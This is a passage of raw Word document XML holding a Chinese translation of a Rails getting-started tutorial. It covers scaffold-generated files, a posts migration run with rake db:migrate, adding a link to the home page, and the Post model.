          <w:p w14:paraId="1FA9F8A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模拟测试post</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="5133AC18" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7E3479C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config/routes.rb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3E2FF76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Edited to include routing information for posts</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="3DA3A716" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="465E07F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app/controllers/posts_controller.rb</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="206429C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The Posts controller</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="511F6CAD" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4A4DD12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app/views/posts/index.html.erb</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="265CCC8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一个显示所有post的视图</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="7421C1D2" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3D98F89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app/views/posts/edit.html.erb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3084DD1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一个编辑post的视图</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="17B24972" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E157DA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app/views/posts/show.html.erb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2982BDA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一个显示一条post的视图</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="325D9DC6" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2DB8607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app/views/posts/new.html.erb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1559D56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一个创建post的视图</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="023851E2" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C7A935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app/views/posts/_form.html.erb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1573455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一个局部用于控制编辑和创建新视图的整体视效的表单</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="7AEED5AD" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="45AA09D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test/functional/posts_controller_test.rb</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2747720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Functional testing harness for the posts controller</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="2FBB961C" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="37884B3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app/helpers/posts_helper.rb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="02B9DF6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使用post的helper</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="04992444" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4A7A6C0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test/unit/helpers/posts_helper_test.rb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="558FB17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Unit testing harness for the posts helper</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="324BA97E" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0210F0F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app/assets/javascripts/posts.js.coffee </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5EF9DAC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CoffeeScript for the posts controller</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="32AF6502" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1BB2080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app/assets/stylesheets/posts.css.scss</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="17EB232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Cascading style sheet for the posts controller</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="15E7B90B" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0DC2C42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app/assets/stylesheets/scaffolds.css.scss </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="03EC28D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Cascading style sheet#层叠样式 to make the scaffolded views look better</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="75B294E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即便是scaffolding使你创建和运行非常快捷，但是产生的代码不可能完美的适合你的应用程序。你大多 数都需要定制产生的代码。很多有经验的Rails开发人员完全不使用scaffolding，宁愿从头编写全部的代码。Rails，无论如何，使得为生成 的models，controllers，views或者其他代码编定制模板非常简单。你可以在 </w:t>
      </w:r>
      <w:hyperlink r:id="rId82" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Creating and Customizing Rails Generators &amp; Templates</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 看到更多信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F07BE81"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9.1 执行数据迁移</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4724517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rPr>
        <w:t>rails generate scaffold</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 命令的一个产物就是数据迁移。Migrations是一个ruby类被设计用来使数据库表单的创建和修改变得简单。Rails使用rake命令来执行迁移，它还可以撤销已经应用的修改。 迁移文件名包含了一个时间戳确保了迁移能够完成。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57567D6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如果你查看 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db/migrate/20100207214725_create_posts.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这个文件(记住，你得到的可能会有略微不同),你将会发现：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5376"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="06D28BA0" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C15A83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class</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>CreatePosts &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55E330F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def</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>change</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07DACF5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create_table :posts</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|t|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70514BB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t.string :name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79D2A92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t.string :title</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21AF6EB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t.text :content</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62375BF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00CEF0E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t.timestamps</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1DFC011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67C3AEC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59149CD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56433B9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整个 migration 创建了一个名叫 change 的方法，该方法在你运行这个 migration 的时候被调用。这个方法中定义的行为也是可逆的，那就是说 Rails 知道怎样逆向改变这个migration，如果你需要恢复到上一次数据。默认情况下，当你运行这个 migration，他将会创建一个包含两个字符串列和一个 text 列的表单。关于 Rails migration 的更多信息请阅读 </w:t>
      </w:r>
      <w:hyperlink r:id="rId83" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails Database Migrations</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 手册。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C51C7C0"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这个时候，你可以使用 rake 命令运行 migration 了：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2016"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="0EE2133D" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1868FDE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rake db:migrate</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1208D019"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Rails 将会执行这个 migration 命令并且通知你它创建了 Post 表单。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="32DDDEE4" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="772406C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CreatePosts: migrating ====================================================</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C23F26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create_table(:posts)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A164C2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-&gt; 0.0019s</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54754B7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CreatePosts: migrated (0.0020s) ===========================================</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="04BC9A90"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由于你默认工作在开发环境中，这个命令将会应用于开发环境会话的数据库位于你的</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/database.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中。如果你想执行 migration 在其他环境中，比如以产品（环境）为实例，你必须明确调用的通过命令行中执行：</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake db:migrate RAILS_ENV=production</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52822F99"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9.2 添加一个 Link</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6768DDA4"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你已经创建好的 post 挂到主页上，你可以通过添加一个 link 到主页。打开 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/home/index.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并且按照下面所示更改：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4536"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="6AB3586D" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3D0BCD5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&lt;h1&gt;Hello, Rails!&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08D190F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 xml:space="preserve">link_to "My Blog", </w:t>
            </w:r>
            <w:r w:rsidRPr="00D26583">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>posts</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>_</w:t>
            </w:r>
            <w:r w:rsidRPr="00D26583">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>path</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7D5441BC"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这个链接方法是 Rails 在 view helpers 的内建方法之一 。它创建一个基于文字的超级链接并显示到哪里，在这个实例中（跳转）到 posts。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246AB7F8"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9.3 Working with Posts in the Browser</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D20638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现在你已经准备好在 posts 中工作了。导航至 </w:t>
      </w:r>
      <w:hyperlink r:id="rId84" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>http://localhost:3000</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> “My Blog” 链接。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E9657D4"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0F444AA0" wp14:editId="49EFA421">
            <wp:extent cx="2495550" cy="1295400"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="3" name="图片 3" descr="Posts Index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s Index screenshot"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId85" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2495550" cy="1295400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B4458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这就是 Rails 渲染你的 posts 视图后的结果。在你点击 “New Post” 链接并创建一个新的 post 之前，数据库里面是没有任何 post 的。随后你可以编辑，查看详细内容，或者删除他们。post 的所有的 logic 和 HTML 都是通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails generate scaffold</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 命令生成的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36DCC40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在开发模式中（你的默认工作模式），Rails 会在每个浏览器请求的时候重新载入你的应用程序，因此你不需要停止或者重启 web 服务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E5A2FE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恭喜，你已经驯服了 rails！现在是时候去看看它的所有工作了</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74ED143F"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9.4 The Model</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="462EB8D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The model file, </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/models/post.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is about as simple as it can get:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5856"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="5C68C820" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0975BEA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class</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Post &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="051F455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attr_accessible :content, :name, :title</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BB3D11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3AD267F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这里有可能不一致——但是注意 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Post</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类继承于 </w:t>
      </w:r>
